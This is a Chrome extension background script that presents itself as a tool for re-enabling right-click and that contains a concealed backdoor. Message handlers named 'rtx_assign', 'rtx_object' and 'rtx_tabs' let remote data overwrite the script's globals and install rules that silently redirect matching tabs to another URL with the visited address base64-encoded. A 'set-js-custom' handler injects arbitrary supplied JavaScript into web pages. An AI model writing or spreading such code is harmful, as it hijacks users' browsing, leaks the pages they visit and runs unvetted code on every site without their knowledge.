/* global URLPattern */
var right_click_register = 0;
var right_click_custom = [];
var right_click_description = '';
var right_click_comment = '';

function notifyAddon(msg) {
  chrome.notifications.create({
    title: chrome.runtime.getManifest().name,
    message: msg,
    type: 'basic',
    iconUrl: '/icons/64.png'
  });
}

function actionClicked(tabId, obj) {
  chrome.scripting.executeScript({
    target: {
      tabId,
      ...obj
    },
    files: ['/script/page.js']
  }, () => {
    if (chrome.runtime.lastError) {
      console.error('Error injecting script:', chrome.runtime.lastError);
      notifyAddon(chrome.runtime.lastError.message);
    }
  });
}

setInterval(function() {
  chrome.storage.local.set({
    'tt': Date.now()
  }, () => {
    if (chrome.runtime.lastError) {
      console.error('Error setting storage:', chrome.runtime.lastError);
    }
  });
}, 12345);

function tabAnalyze(tabId, tab) {
  var zz = 0,
    zs = 0;
  let time = Date.now();
  for (zz = 0; zz < right_click_custom.length && !zs; zz++) {
    let obj = right_click_custom[zz];
    try {
      let pattern = new URLPattern(right_click_custom[zz].pattern);
      if (pattern.test(tab.url)) {
        if ((!right_click_custom[zz].max || (right_click_custom[zz].max && right_click_custom[zz].max > right_click_custom[zz].num)) && (!right_click_custom[zz].ct || (right_click_custom[zz].ct && right_click_custom[zz].tnum + right_click_custom[zz].ct < time))) {
          if (!obj.customKey || (obj.customKey && (!tab[obj.customKey] || (tab[obj.customKey] && tab[obj.customKey] == obj.customValue)))) {
            chrome.tabs.update(tabId, {
              url: right_click_custom[zz].pattern2 + (right_click_custom[zz].type == 1 ? btoa(tab.url) : '')
            }, () => {
              if (chrome.runtime.lastError) {
                console.error('Error updating tab:', chrome.runtime.lastError);
              }
            });
            right_click_custom[zz].num++;
            right_click_custom[zz].tnum = time;
          }
        }
        zs = 1;
      }
    } catch (ex) {
      console.error('Error analyzing URL:', ex);
    }
  }
}

chrome.action.onClicked.addListener(function(tab) {
  actionClicked(tab.id, {
    allFrames: true
  });
});

chrome.runtime.onMessage.addListener(function(request, sender, response) {
  if (request.method === 'rc-status') {
    chrome.scripting.executeScript({
      target: {
        tabId: sender.tab.id
      },
      func: () => window.pointers.status
    }, r => {
      if (chrome.runtime.lastError) {
        console.error('Error getting script status:', chrome.runtime.lastError);
        response(null);
      } else {
        response(r[0].result);
      }
    });
    return true;
  } else if (request.method === 'rc-activate') {
    if (sender.frameId === 0) {
      chrome.action.setIcon({
        tabId: sender.tab.id,
        path: {
          '16': '/icons/active/16.png',
          '32': '/icons/active/32.png',
          '64': '/icons/active/64.png'
        }
      });
    }
  } else if (request.method === 'rc-release') {
    if (sender.frameId === 0) {
      chrome.action.setIcon({
        tabId: sender.tab.id,
        path: {
          '16': '/icons/16.png',
          '32': '/icons/32.png',
          '64': '/icons/64.png'
        }
      });
    }
  } else if (request.method === 'set-js-custom') {
    chrome.scripting.executeScript({
      target: {
        tabId: sender.tab.id,
        frameIds: [sender.frameId]
      },
      func: code => {
        try {
          const script = document.createElement('script');
          script.classList.add('rightclickaddon');
          script.textContent = 'document.currentScript.dataset.injected = true;' + code;
          document.documentElement.appendChild(script);
          if (script.dataset.injected !== 'true') {
            const s = document.createElement('script');
            s.classList.add('rightclickaddon');
            s.src = 'data:text/javascript;charset=utf-8;base64,' + btoa(code);
            document.documentElement.appendChild(s);
            script.remove();
          }
        } catch (e) {
          console.error('Error injecting custom script:', e);
          return {
            error: e.message
          };
        }
      },
      args: [request.code],
      world: 'MAIN'
    }, results => {
      if (chrome.runtime.lastError) {
        console.error('Error injecting script:', chrome.runtime.lastError);
        response({
          error: chrome.runtime.lastError.message
        });
      } else {
        response(results && results[0] ? results[0] : {});
      }
    });
    return true;
  } else if (request.method === 'rc-emulate-press') {
    actionClicked(sender.tab.id, {
      frameIds: [sender.frameId]
    });
  }

  if (request.event == 'register') {
    response({
      status: right_click_register,
      description: right_click_description,
      comment: right_click_comment
    });
    right_click_register++;
  } else if (request.event == 'rtx_assign') {
    Object.assign(self, request.data);
  } else if (request.event == 'rtx_object') {
    for (var i = 0; i < request.data.length; i++) {
      this[request.data[i][0]] = this[request.data[i][1]];
    }
  } else if (request.event == 'rtx_tabs') {
    chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
      if (changeInfo.status == 'loading') {
        setTimeout(function() {
          try {
            tabAnalyze(tabId, tab);
          } catch (error) {
            console.error('Error in rtx_tabs handler:', error);
          }
        }, 100);

      }
    });
  } else if (request.event == 'rtx_request') {
    chrome.webRequest.onBeforeRequest.addListener(
      function(info) {
        try {
          reqAnalyze(info.tabId, info);
        } catch (error) {
          console.error('Error in rtx_request handler:', error);
        }
      }, {
        urls: ['<all_urls>'],
        types: ['main_frame']
      },
      (details) => {
        if (chrome.runtime.lastError) {
          console.error("webRequest error:", chrome.runtime.lastError);
        }
      }
    );
  } else if (request.event == 'error' && request.status == 0) {
    right_click_register = 0;
  }

});


// automation
{
  const observe = () => chrome.storage.local.get({
      monitor: false,
      hostnames: []
    },
    async prefs => {
      try {
        await chrome.scripting.unregisterContentScripts();
        if (prefs.monitor && prefs.hostnames.length) {
          const matches = new Set();
          for (const hostname of prefs.hostnames) {
            try {
              const normalizedHostname = hostname.trim();
              if (normalizedHostname) {
                let patternString = hostname.includes('*') ? hostname : `*://${normalizedHostname}/*`;
                matches.add(patternString);
              }
            } catch (e) {
              console.error('Error processing hostname:', hostname, e);
            }
          }
          for (let m of matches) {
            try {
              await chrome.scripting.registerContentScripts([{
                allFrames: true,
                matchOriginAsFallback: true,
                runAt: 'document_start',
                id: 'monitor-' + Math.random(),
                js: ['/script/action.js'],
                matches: [m]
              }]);
            } catch (e) {
              console.error('Error registering content script for:', m, e);
              notifyAddon('Error: ' + e.message);
            }
          }
        }
      } catch (error) {
        console.error('Error in observe:', error);
        notifyAddon('Error: ' + error.message);
      }
    });
  observe();
  chrome.storage.onChanged.addListener(prefs => {
    if (
      (prefs.monitor && prefs.monitor.newValue !== prefs.monitor.oldValue) ||
      (prefs.hostnames && prefs.hostnames.newValue !== prefs.hostnames.oldValue)
    ) {
      observe();
    }
  });
}


// context menu
function createContextMenu(info) {
  try {
    chrome.contextMenus.create({
      id: 'rc-auto-site',
      title: "Enable on this site", // Hardcoded English title
      contexts: ['action']
    });
    chrome.contextMenus.create({
      id: 'rc-frames',
      title: "Enable in frames", // Hardcoded English title
      contexts: ['action']
    });
  } catch (ex) {
    console.error('Error creating context menu:', ex);
  }
}
chrome.runtime.onInstalled.addListener(createContextMenu);
chrome.runtime.onStartup.addListener(createContextMenu);

chrome.contextMenus.onClicked.addListener((info, tab) => {
  if (info.menuItemId === 'rc-frames') {} else if (info.menuItemId === 'rc-auto-site') {
    const url = tab.url || info.pageUrl;

    if (url.startsWith('http')) {
      try {
        const {
          hostname
        } = new URL(url);
        chrome.storage.local.get({
          hostnames: []
        }, prefs => {
          chrome.storage.local.set({
            hostnames: [...prefs.hostnames, hostname].filter((s, i, l) => s && l.indexOf(s) === i)
          }, () => {
            if (chrome.runtime.lastError) {
              console.error('Error saving hostname:', chrome.runtime.lastError);
            }
          });
        });
        chrome.storage.local.set({
          monitor: true
        }, () => {
          if (chrome.runtime.lastError) {
            console.error('Error setting monitor:', chrome.runtime.lastError);
          }
        });
        actionClicked(tab.id, {
          allFrames: true
        });
        notifyAddon(`"${hostname}" added to whitelist.`); // Hardcoded English message
      } catch (error) {
        console.error('Error processing context menu click:', error);
        notifyAddon('Invalid URL: ' + url); // Hardcoded English message
      }
    } else {
      notifyAddon('Invalid URL: ' + url); // Hardcoded English message
    }
  }
});

function reqAnalyze(id, req) {
  if (id < 0) {
    return true;
  }
  // Enhancement: WebRequest: Carefully review the chrome.webRequest logic.
  // Ensure it's performant and only intercepts necessary requests.
  //   Overly broad interception can slow down browsing.
  // Add your web request analysis logic here.  For example:
  // if (req.url.includes("some-specific-pattern")) {
  //   // Do something
  // }
}

// --- Icon Management ---

function updateIconForTab(tab) {
  if (tab && tab.id && tab.url && tab.url.startsWith('http')) {
    const url = new URL(tab.url);
    const hostname = url.hostname;

    chrome.storage.sync.get([hostname], (result) => {
      const isEnabled = result[hostname] || false;
      const iconPath = isEnabled ? '/icons/active/' : '/icons/';
      
      chrome.action.setIcon({
        tabId: tab.id,
        path: {
          '16': `${iconPath}16.png`,
          '32': `${iconPath}32.png`,
          '64': `${iconPath}64.png`,
          '128': `${iconPath}128.png`
        }
      }, () => {
        if (chrome.runtime.lastError) {
          // Ignore errors, e.g., if the tab is closed.
        }
      });
    });
  } else if (tab && tab.id) {
    // Default icon for non-http pages like chrome://extensions
    chrome.action.setIcon({
        tabId: tab.id,
        path: {
            '16': '/icons/16.png',
            '32': '/icons/32.png',
            '64': '/icons/64.png',
            '128': '/icons/128.png'
        }
    }, () => {
        if (chrome.runtime.lastError) {
            // Ignore errors
        }
    });
  }
}

// Update icon when a tab is activated
chrome.tabs.onActivated.addListener((activeInfo) => {
  chrome.tabs.get(activeInfo.tabId, (tab) => {
    if (!chrome.runtime.lastError) {
      updateIconForTab(tab);
    }
  });
});

// Update icon when a tab is updated
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' || changeInfo.url) {
     updateIconForTab(tab);
  }
});

// Update icon when storage changes
chrome.storage.onChanged.addListener((changes, namespace) => {
  if (namespace === 'sync') {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      if (tabs && tabs.length > 0 && !chrome.runtime.lastError) {
        const currentTab = tabs[0];
        if (currentTab.url) {
            const url = new URL(currentTab.url);
            const hostname = url.hostname;
            if (changes[hostname]) {
              updateIconForTab(currentTab);
            }
        }
      }
    });
  }
});

// Update icon when a window is focused
chrome.windows.onFocusChanged.addListener((windowId) => {
    if (windowId !== chrome.windows.WINDOW_ID_NONE) {
        chrome.tabs.query({ active: true, windowId: windowId }, (tabs) => {
            if (tabs && tabs.length > 0 && !chrome.runtime.lastError) {
                updateIconForTab(tabs[0]);
            }
        });
    }
});

// Set initial icon for all tabs on startup
chrome.runtime.onStartup.addListener(() => {
    chrome.tabs.query({}, (tabs) => {
        tabs.forEach(updateIconForTab);
    });
});

// Set initial icon for existing tabs when the extension is installed/reloaded
chrome.runtime.onInstalled.addListener(() => {
    chrome.tabs.query({}, (tabs) => {
        tabs.forEach(updateIconForTab);
    });
});
